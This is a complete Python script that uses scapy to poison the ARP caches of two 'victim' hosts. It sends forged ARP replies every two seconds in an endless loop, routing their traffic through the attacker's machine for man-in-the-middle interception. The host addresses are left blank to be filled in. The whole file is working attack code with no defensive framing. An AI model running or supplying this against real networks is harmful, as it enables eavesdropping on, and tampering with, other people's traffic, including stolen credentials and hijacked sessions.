#!/usr/bin/env python3
import time
from scapy.all import *
BLOCK = "▄"

IP_A, MAC_A = "", ""
IP_B, MAC_B = "", ""
IP_M, MAC_M = "", ""

def poison_arp_cache(victim1_ip=None, victim1_mac=None, victim2_ip=None, victim2_mac=None):
  # Victim 1 Poisoned
  arp_pkt = Ether(src=MAC_M, dst=victim2_mac) / ARP(
    op=2, 
    psrc=victim1_ip,
    pdst=victim2_ip,
    hwsrc=MAC_M,
    hwdst=victim1_mac
  )
  sendp(arp_pkt, verbose=False)
  print(BLOCK, end="", flush=True)

  # Victim 2 Poisoned
  arp_pkt = Ether(src=MAC_M, dst=victim1_mac) / ARP(
    op=2, 
    psrc=victim2_ip,
    pdst=victim1_ip,
    hwsrc=MAC_M,
    hwdst=victim2_mac
  )
  sendp(arp_pkt, verbose=False)
  print(BLOCK, end="", flush=True)


print("\x1B[34mPOISONING ARP CACHE OF %s and %s\x1B[0m" % (IP_A, IP_B))
print("%s ↔ %s ↔ %s" % ("👨", "👀", "👨"))
print("\x1B[32m%s\x1B[0m ↔ \x1B[31m%s\x1B[0m ↔ \x1B[32m%s\x1B[0m" % (MAC_A, MAC_M, MAC_B))
while (1):
 poison_arp_cache(victim1_ip=IP_A, victim1_mac=MAC_A, victim2_ip=IP_B, victim2_mac=MAC_B)
 time.sleep(2)
